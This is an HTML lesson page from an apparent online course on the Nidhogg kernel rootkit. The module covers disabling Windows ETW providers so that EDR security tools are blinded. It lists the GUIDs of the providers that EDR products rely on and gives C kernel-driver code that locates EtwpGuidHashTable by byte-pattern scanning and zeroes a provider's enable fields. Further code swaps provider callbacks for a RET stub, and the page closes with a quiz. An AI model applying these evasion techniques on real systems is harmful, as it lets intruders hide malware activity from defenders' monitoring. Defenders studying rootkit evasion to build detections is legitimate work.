@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 5: ETW Provider Disabling - Nidhogg Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F409;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#dc2626;--accent2:#b91c1c;--gradient:linear-gradient(135deg,#dc2626,#b91c1c)}</style>
+</head>
+<body>
+
+<button class="hamburger" aria-label="Toggle navigation">&#9776;</button>
+
+<nav>
+<div class="logo">
+<h2>Nidhogg Course</h2>
+<span>Kernel Rootkit Masterclass</span>
+</div>
+<a class="home-link" href="../Nidhogg_index.html">&larr; Course Home</a>
+<a class="mod-link" href="module1.html"><span>1. Kernel vs User-Mode</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module2.html"><span>2. Driver Basics</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module3.html"><span>3. Process &amp; Thread</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module4.html"><span>4. File &amp; Registry</span><span class="diff d2">d2</span></a>
+<a class="mod-link active" href="module5.html"><span>5. ETW Disabling</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module6.html"><span>6. Callbacks &amp; Notifications</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module7.html"><span>7. Memory Evasion</span><span class="diff d3">d3</span></a>
+<a class="mod-link" href="module8.html"><span>8. Full Chain &amp; Detection</span><span class="diff d3">d3</span></a>
+</nav>
+
+<main>
+<span class="diff-badge med">Difficulty: Intermediate</span>
+<h1>Module 5: ETW Provider Disabling</h1>
+<p class="subtitle">Blinding EDR telemetry by manipulating ETW provider internals from kernel mode.</p>
+
+<div class="card highlight">
+<h4>Module Objective</h4>
+<p>Understand the Event Tracing for Windows (ETW) architecture, how EDR products depend on ETW providers for telemetry, the kernel data structures behind ETW (GuidEntry, provider registration tables), and how Nidhogg disables specific ETW providers to blind security monitoring.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>1. ETW Architecture Overview</h2>
+
+<p>Event Tracing for Windows (ETW) is the primary telemetry framework built into the Windows kernel. It consists of three components:</p>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">ETW Architecture</h4>
+<div class="flow">
+<div class="flow box">Providers<br><small>Emit events<br>(kernel + user)</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">Trace Sessions<br><small>Buffer &amp; route<br>events</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">Consumers<br><small>Read events<br>(EDR, ETL files)</small></div>
+</div>
+</div>
+
+<table>
+<tr><th>Component</th><th>Role</th><th>Examples</th></tr>
+<tr><td><strong>Provider</strong></td><td>Generates events when specific activities occur</td><td>Microsoft-Windows-Kernel-Process, Microsoft-Windows-Threat-Intelligence, Microsoft-Windows-DotNETRuntime</td></tr>
+<tr><td><strong>Session (Controller)</strong></td><td>Creates trace sessions, enables providers, manages buffers</td><td>NT Kernel Logger, Circular Kernel Context Logger, EDR private sessions</td></tr>
+<tr><td><strong>Consumer</strong></td><td>Reads events from sessions in real-time or from ETL files</td><td>EDR agent, Event Viewer, PerfMon, xperf</td></tr>
+</table>
+
+<p>Each provider is identified by a GUID. When a provider is enabled in a trace session, events flow from the provider through kernel buffers to the consumer. If the provider is disabled or its registration is corrupted, <strong>no events are generated</strong> &mdash; the consumer receives nothing.</p>
+
+<!-- ============================================================ -->
+<h2>2. Critical ETW Providers for EDR</h2>
+
+<p>EDR products rely heavily on specific ETW providers for visibility into system activity. Disabling these providers blinds the EDR to specific categories of events:</p>
+
+<table>
+<tr><th>Provider</th><th>GUID</th><th>What It Reports</th></tr>
+<tr><td><strong>Microsoft-Windows-Threat-Intelligence</strong></td><td><code>{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}</code></td><td>Memory allocation, process injection, credential access &mdash; the most critical EDR provider</td></tr>
+<tr><td><strong>Microsoft-Windows-Kernel-Process</strong></td><td><code>{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}</code></td><td>Process creation, termination, thread start/stop</td></tr>
+<tr><td><strong>Microsoft-Windows-Kernel-File</strong></td><td><code>{EDD08927-9CC4-4E65-B970-C2560FB5C289}</code></td><td>File create, read, write, delete operations</td></tr>
+<tr><td><strong>Microsoft-Windows-Kernel-Registry</strong></td><td><code>{70EB4F03-C1DE-4F73-A051-33D13D5413BD}</code></td><td>Registry key/value operations</td></tr>
+<tr><td><strong>Microsoft-Windows-Kernel-Network</strong></td><td><code>{7DD42A49-5329-4832-8DFD-43D979153A88}</code></td><td>TCP/UDP connection events</td></tr>
+</table>
+
+<div class="card warn">
+<h4>The Threat Intelligence Provider</h4>
+<p>The <code>Microsoft-Windows-Threat-Intelligence</code> provider is special: it is a <strong>secure ETW provider</strong> that requires <code>Protected Process Light (PPL)</code> or Early Launch Antimalware (ELAM) status to consume. This means user-mode patching of <code>ntdll!EtwEventWrite</code> does <strong>not</strong> affect it. Only kernel-level manipulation can disable this provider.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>3. ETW Kernel Internals</h2>
+
+<p>Inside the kernel, ETW providers are tracked through a series of undocumented structures. The key structures are:</p>
+
+<pre><span class="lang-tag">C</span>// Simplified ETW kernel structures (undocumented, reverse-engineered)
+
+// ETW_GUID_ENTRY - represents a registered provider GUID
+typedef struct _ETW_GUID_ENTRY {
+    LIST_ENTRY     GuidList;         // Links all GUIDs in same hash bucket
+    LONG           RefCount;         // Reference count
+    GUID           Guid;             // The provider GUID
+    LIST_ENTRY     RegListHead;      // Head of registration list
+    ULONG          ProviderEnableInfo; // Enable flags
+    // ... additional fields
+    USHORT         EnableCount;      // Number of sessions enabling this provider
+    ULONG          IsEnabled;        // Whether provider is currently enabled
+    // ...
+} ETW_GUID_ENTRY, *PETW_GUID_ENTRY;
+
+// ETW_REG_ENTRY - represents a specific provider registration
+typedef struct _ETW_REG_ENTRY {
+    LIST_ENTRY     RegList;          // Links to ETW_GUID_ENTRY.RegListHead
+    PETW_GUID_ENTRY GuidEntry;      // Back-pointer to the GUID entry
+    // ... callback pointers, session info
+} ETW_REG_ENTRY, *PETW_REG_ENTRY;
+
+// Providers are stored in a hash table indexed by GUID
+// Each bucket is a linked list of ETW_GUID_ENTRY structures</pre>
+
+<div class="card">
+<h4>The GuidEntry Table</h4>
+<p>The kernel maintains a global hash table of ETW_GUID_ENTRY structures, accessible from the <code>EtwpGuidHashTable</code> global variable in <code>ntoskrnl.exe</code>. Each entry in the hash table is the head of a linked list of providers sharing the same hash bucket. To find a specific provider, the kernel hashes the GUID and walks the corresponding bucket.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>4. Nidhogg's Provider Disabling Approach</h2>
+
+<p>Nidhogg disables ETW providers by manipulating the <code>ETW_GUID_ENTRY</code> structure for the target provider. The approach involves finding the GuidEntry and modifying its enable state:</p>
+
+<pre><span class="lang-tag">C</span>NTSTATUS DisableEtwProvider(GUID* targetGuid) {
+    // 1. Locate EtwpGuidHashTable in ntoskrnl
+    //    This requires pattern scanning ntoskrnl's .data section
+    PVOID guidHashTable = FindEtwpGuidHashTable();
+    if (!guidHashTable) return STATUS_NOT_FOUND;
+
+    // 2. Hash the target GUID to find the correct bucket
+    ULONG bucketIndex = HashGuid(targetGuid) % ETW_GUID_HASH_BUCKETS;
+    PLIST_ENTRY bucketHead = &((PLIST_ENTRY)guidHashTable)[bucketIndex];
+
+    // 3. Walk the bucket's linked list to find our target GUID
+    for (PLIST_ENTRY entry = bucketHead->Flink;
+         entry != bucketHead;
+         entry = entry->Flink)
+    {
+        PETW_GUID_ENTRY guidEntry = CONTAINING_RECORD(
+            entry, ETW_GUID_ENTRY, GuidList
+        );
+
+        if (IsEqualGUID(&guidEntry->Guid, targetGuid)) {
+            // 4. Disable the provider
+            guidEntry->IsEnabled = 0;
+            guidEntry->EnableCount = 0;
+
+            // 5. Clear the ProviderEnableInfo flags
+            guidEntry->ProviderEnableInfo = 0;
+
+            return STATUS_SUCCESS;
+        }
+    }
+
+    return STATUS_NOT_FOUND;  // Provider GUID not registered
+}</pre>
+
+<!-- ============================================================ -->
+<h2>5. Finding EtwpGuidHashTable</h2>
+
+<p>The global hash table is not exported by ntoskrnl, so Nidhogg must find it through pattern scanning. A common approach is to locate a known function that references the table:</p>
+
+<pre><span class="lang-tag">C</span>PVOID FindEtwpGuidHashTable() {
+    // Strategy: Find EtwpGetGuidEntry function in ntoskrnl
+    // This function references EtwpGuidHashTable directly
+
+    // 1. Get ntoskrnl base address
+    PVOID ntoskrnlBase = GetNtoskrnlBase();
+    if (!ntoskrnlBase) return NULL;
+
+    // 2. Locate EtwpGetGuidEntry by scanning for its signature
+    // The function has a characteristic pattern involving:
+    //   - GUID hashing
+    //   - Array index calculation
+    //   - LEA instruction referencing the hash table
+    PUCHAR funcAddr = ScanForPattern(
+        ntoskrnlBase,
+        GetNtoskrnlSize(),
+        // Pattern for the LEA instruction that loads the table address
+        "\x48\x8D\x0D",  // LEA RCX, [rip+offset]
+        "xxx",
+        // ... additional context bytes for uniqueness
+    );
+
+    if (!funcAddr) return NULL;
+
+    // 3. Extract the RIP-relative offset from the LEA instruction
+    LONG ripOffset = *(PLONG)(funcAddr + 3);
+    PVOID hashTable = funcAddr + 7 + ripOffset;  // 7 = instruction length
+
+    return hashTable;
+}</pre>
+
+<div class="card warn">
+<h4>Fragility of Pattern Scanning</h4>
+<p>Pattern scanning ntoskrnl is inherently fragile. Microsoft can change function prologues, compiler optimizations, or instruction ordering between builds. Nidhogg must maintain patterns for each supported Windows version, or use more robust techniques like disassembling known exported functions that eventually call the target internal function.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>6. Alternative: Patching Provider Callbacks</h2>
+
+<p>Another approach to disabling ETW providers is to patch the provider's callback function pointer. Each registration has a callback that is invoked when events should be generated:</p>
+
+<pre><span class="lang-tag">C</span>// Instead of modifying IsEnabled, patch the callback to a no-op RET
+NTSTATUS PatchProviderCallback(PETW_REG_ENTRY regEntry) {
+    // The callback pointer in the registration entry
+    PVOID originalCallback = regEntry->Callback;
+
+    // Replace with a pointer to a simple RET instruction
+    // (must be in non-paged, executable memory)
+    static UCHAR retStub[] = { 0xC3 };  // RET
+
+    // Allocate executable kernel memory for the stub
+    PVOID stubMem = ExAllocatePool2(
+        POOL_FLAG_NON_PAGED_EXECUTE,
+        sizeof(retStub),
+        'ediN'
+    );
+    RtlCopyMemory(stubMem, retStub, sizeof(retStub));
+
+    // Replace the callback pointer
+    InterlockedExchangePointer(&regEntry->Callback, stubMem);
+
+    return STATUS_SUCCESS;
+}</pre>
+
+<p>This approach is more targeted: it affects only the specific registration instance rather than the entire GUID entry, allowing finer-grained control over which sessions receive (or do not receive) events.</p>
+
+<!-- ============================================================ -->
+<h2>7. User-Mode ETW Patching vs Kernel-Mode</h2>
+
+<p>Comparing Nidhogg's kernel-level approach with traditional user-mode ETW blinding:</p>
+
+<table>
+<tr><th>Aspect</th><th>User-Mode Patching</th><th>Kernel-Mode (Nidhogg)</th></tr>
+<tr><td><strong>Target</strong></td><td>Patch <code>ntdll!EtwEventWrite</code> in own process</td><td>Modify ETW_GUID_ENTRY in kernel memory</td></tr>
+<tr><td><strong>Scope</strong></td><td>Only affects the patched process</td><td>System-wide: all processes stop generating events for the disabled provider</td></tr>
+<tr><td><strong>Secure providers</strong></td><td>Cannot disable (TI provider requires PPL)</td><td>Can disable any provider including Threat Intelligence</td></tr>
+<tr><td><strong>Detection</strong></td><td>Integrity checks on ntdll detect the patch</td><td>No user-mode artifact; only kernel memory forensics reveal it</td></tr>
+<tr><td><strong>Persistence</strong></td><td>Lost on process restart</td><td>Persistent as long as driver is loaded</td></tr>
+<tr><td><strong>Risk</strong></td><td>Low &mdash; worst case is process crash</td><td>BSOD if kernel structures are corrupted</td></tr>
+</table>
+
+<!-- ============================================================ -->
+<h2>8. Impact on EDR Products</h2>
+
+<p>When Nidhogg disables critical ETW providers, the impact on EDR is severe:</p>
+
+<div class="card green">
+<h4>Telemetry Gaps Created</h4>
+<ul>
+<li><strong>Threat Intelligence disabled</strong>: EDR loses visibility into memory allocations, process hollowing, shellcode injection, and credential dumping</li>
+<li><strong>Kernel-Process disabled</strong>: No process creation/termination events &mdash; new processes appear unannounced</li>
+<li><strong>Kernel-File disabled</strong>: File operations become invisible &mdash; tools can drop files without generating events</li>
+<li><strong>Kernel-Network disabled</strong>: Network connections are not reported &mdash; C2 traffic flows unmonitored</li>
+</ul>
+</div>
+
+<p>The EDR consumer (the user-mode agent) simply receives no events from the disabled providers. From the agent's perspective, nothing is happening on the system. There is typically no error or notification that the provider was disabled &mdash; the event stream just goes silent.</p>
+
+<!-- ============================================================ -->
+<h2>9. Re-enabling Providers</h2>
+
+<p>Nidhogg should support re-enabling providers (during driver unload or via IOCTL). The restoration process reverses the GuidEntry modifications:</p>
+
+<pre><span class="lang-tag">C</span>// Structure to save original provider state for restoration
+typedef struct _SAVED_PROVIDER_STATE {
+    GUID    ProviderGuid;
+    ULONG   OriginalIsEnabled;
+    USHORT  OriginalEnableCount;
+    ULONG   OriginalProviderEnableInfo;
+} SAVED_PROVIDER_STATE;
+
+#define MAX_DISABLED_PROVIDERS 16
+SAVED_PROVIDER_STATE g_DisabledProviders[MAX_DISABLED_PROVIDERS];
+ULONG g_DisabledCount = 0;
+
+NTSTATUS RestoreEtwProvider(GUID* targetGuid) {
+    // Find the saved state
+    for (ULONG i = 0; i < g_DisabledCount; i++) {
+        if (IsEqualGUID(&g_DisabledProviders[i].ProviderGuid, targetGuid)) {
+            // Find the GuidEntry again and restore original values
+            PETW_GUID_ENTRY entry = FindGuidEntry(targetGuid);
+            if (entry) {
+                entry->IsEnabled = g_DisabledProviders[i].OriginalIsEnabled;
+                entry->EnableCount = g_DisabledProviders[i].OriginalEnableCount;
+                entry->ProviderEnableInfo =
+                    g_DisabledProviders[i].OriginalProviderEnableInfo;
+                return STATUS_SUCCESS;
+            }
+        }
+    }
+    return STATUS_NOT_FOUND;
+}</pre>
+
+<!-- ============================================================ -->
+<div class="quiz">
+<h2>Knowledge Check</h2>
+
+<div class="quiz-q" data-answer="B">
+<p>Q1: Why can't user-mode ETW patching disable the Threat Intelligence provider?</p>
+<div class="quiz-btn" data-choice="A">A) The Threat Intelligence provider runs in a separate process</div>
+<div class="quiz-btn" data-choice="B">B) The Threat Intelligence provider is a secure provider that requires PPL/ELAM status to consume, and its events are generated in the kernel, not through ntdll!EtwEventWrite</div>
+<div class="quiz-btn" data-choice="C">C) User-mode code cannot call ETW APIs</div>
+<div class="quiz-btn" data-choice="D">D) The Threat Intelligence provider uses a different event format</div>
+</div>
+
+<div class="quiz-q" data-answer="A">
+<p>Q2: What kernel structure does Nidhogg modify to disable an ETW provider?</p>
+<div class="quiz-btn" data-choice="A">A) The ETW_GUID_ENTRY for the provider, specifically its IsEnabled and EnableCount fields</div>
+<div class="quiz-btn" data-choice="B">B) The System Service Descriptor Table (SSDT)</div>
+<div class="quiz-btn" data-choice="C">C) The process's PEB structure</div>
+<div class="quiz-btn" data-choice="D">D) The NTFS driver's IRP dispatch table</div>
+</div>
+
+<div class="quiz-q" data-answer="C">
+<p>Q3: What happens to an EDR consumer when the ETW provider it relies on is disabled?</p>
+<div class="quiz-btn" data-choice="A">A) The EDR receives error events indicating provider failure</div>
+<div class="quiz-btn" data-choice="B">B) The EDR automatically switches to an alternative data source</div>
+<div class="quiz-btn" data-choice="C">C) The EDR simply receives no events from that provider with no error notification &mdash; the event stream goes silent</div>
+<div class="quiz-btn" data-choice="D">D) The EDR process crashes</div>
+</div>
+</div>
+
+<div class="nav-btns">
+<a href="module4.html">&larr; Previous: File &amp; Registry Protection</a>
+<a class="primary" href="module6.html">Next: Kernel Callbacks &amp; Notification Routines &rarr;</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
